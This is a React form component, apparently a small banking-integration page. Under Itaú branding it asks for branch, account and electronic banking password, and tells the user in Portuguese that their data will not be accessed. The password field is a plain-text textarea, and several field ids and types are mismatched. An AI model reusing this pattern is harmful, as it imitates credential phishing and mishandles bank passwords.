import React from 'react';
import "./style.css"

const Form: React.FC = () => {

  return (
    <div className='form-content'>
        <div className='integration-icon'>
            <img src="src/assets/itau.png" alt="" />
        </div>

        <div>
            <p className='text-info'>Visualizaremos as suas informações no modo leitura. Não teremos acesso ao seus dados.</p>
            <form action="/pagina-processa-dados-do-form" method="post">
                <div>
                    <label>Agencia:</label>
                    <input type="text" id="agencia" />
                </div>
                <div>
                    <label>Conta:</label>
                    <input type="email" id="email" />
                </div>
                <div>
                    <label>Senha eletronica:</label>
                    <textarea id="conta"></textarea>
                </div>
            </form>
        </div>

    </div>

  );
}

export default Form
